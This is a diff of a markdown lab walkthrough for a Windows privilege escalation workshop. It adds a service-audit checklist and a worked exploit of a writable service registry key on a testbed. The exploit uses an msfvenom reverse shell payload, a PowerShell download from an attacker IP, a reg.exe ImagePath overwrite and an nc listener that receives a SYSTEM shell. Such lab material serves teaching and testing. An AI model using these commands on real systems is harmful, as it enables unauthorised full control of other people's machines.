@@ -1,6 +1,4 @@
-###
-Privilege Escalation Workshop using LPE Workshop (https://github.com/sagishahar/lpeworkshop) and some of my own custom binaries and scripts.
-###
+## Privilege Escalation Workshop using LPE Workshop (https://github.com/sagishahar/lpeworkshop) and some of my own custom binaries and scripts. ##
 
 Because this is a privilege escalation workshop, we are starting with a powershell reverse shell as a low privilege user. 
 
@@ -533,3 +531,129 @@ PS C:\Windows\system32> hostname.exe
 LPETestbed
 PS C:\Windows\system32>
 ````
+Whenever we encounter non-standard services, we want to audit their security. Privesc scripts are good for that, but we should also do it manually. I like to audit Windows Services using these steps:
+
+1. Service Path
+  a. Is the service path quoted?
+  b. Is the service binary writable with my permissions?
+  c. Is the directory of the service binary writable?
+2. Registry
+  a. Are the registry entries for the service writable?
+  b. Are there keys that the service is referencing that are writable?
+  c. Is the service modifying OTHER registry keys?
+3. PATH issues
+  a. Are there things in front of %WINDIR% in the PATH?
+  b. Is the first thing in the PATH writable?
+4. Hijacking issues
+  a. Is the service referencing dlls/exes by relative instead of absolute paths?
+  b. Is the service relying on Windows to locate binaries?
+  
+These are some quick checks we can do to audit services.
+
+So let's look at one of the services that was listed as non-standard and start from the top.
+
+````  Name             : regsvc
+  DisplayName      : Insecure Registry Service
+  Company Name     : 
+  Description      : 
+  State            : Stopped
+  StartMode        : Manual
+  PathName         : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
+  IsDotNet         : False
+  ````
+  The service path is quoted.
+  
+  Let's check our permissions on the service:
+  
+  ````PS C:\Program Files> icacls.exe "Insecure Registry Service"
+Insecure Registry Service NT SERVICE\TrustedInstaller:(I)(F)
+                          NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+                          NT AUTHORITY\SYSTEM:(I)(F)
+                          NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                          BUILTIN\Administrators:(I)(F)
+                          BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                          BUILTIN\Users:(I)(RX)
+                          BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+                          CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+````
+We can see that we can't write to that folder, or delete it.
+
+What about the binary itself?
+
+````PS C:\Program Files\Insecure Registry Service> icacls.exe *
+insecureregistryservice.exe NT AUTHORITY\SYSTEM:(I)(F)
+                            BUILTIN\Administrators:(I)(F)
+                            BUILTIN\Users:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+````
+We can't do anything to the binary itself.
+
+Let's check the registry:
+
+````
+PS C:\Users\user\Downloads> Get-Acl -Path HKLM:\System\CurrentControlSet\Services\regsvc | fl
+
+
+Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc
+Owner  : BUILTIN\Administrators
+Group  : NT AUTHORITY\SYSTEM
+Access : Everyone Allow  ReadKey
+         NT AUTHORITY\INTERACTIVE Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         BUILTIN\Administrators Allow  FullControl
+Audit  : 
+Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)
+
+
+
+PS C:\Users\user\Downloads> 
+````
+Bingo! We have full control of the registry key for that service.
+
+So now we create our payload:
+````root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service > insecureregistryservice.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe-service file: 15872 bytes
+````
+Now we transfer that file to a location we control:
+
+``(New-Object System.Net.WebClient).DownloadFile("http://10.22.6.122/insecureregistryservice.exe", "C:\Users\user\Downloads\insecureregistryservice.exe")``
+
+Then we modify the registry key:
+
+````PS C:\Users\user\Downloads> reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\user\Downloads\insecureregistryservice.exe /f
+The operation completed successfully.
+
+PS C:\Users\user\Downloads> 
+````
+Then we start the service:
+````PS C:\Users\user\Downloads> net start regsvc
+The Insecure Registry Service service is starting.
+PS C:\Users\user\Downloads> 
+````
+And now we have a shell as NT\Authority SYSTEM
+````
+root@kali:~/LPEWorkshop# nc -lvnp 31337
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::31337
+Ncat: Listening on 0.0.0.0:31337
+Ncat: Connection from 10.22.6.49.
+Ncat: Connection from 10.22.6.49:64643.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami & hostname
+whoami & hostname
+nt authority\system
+LPETestbed
+
+C:\Windows\system32>
+````
+
+
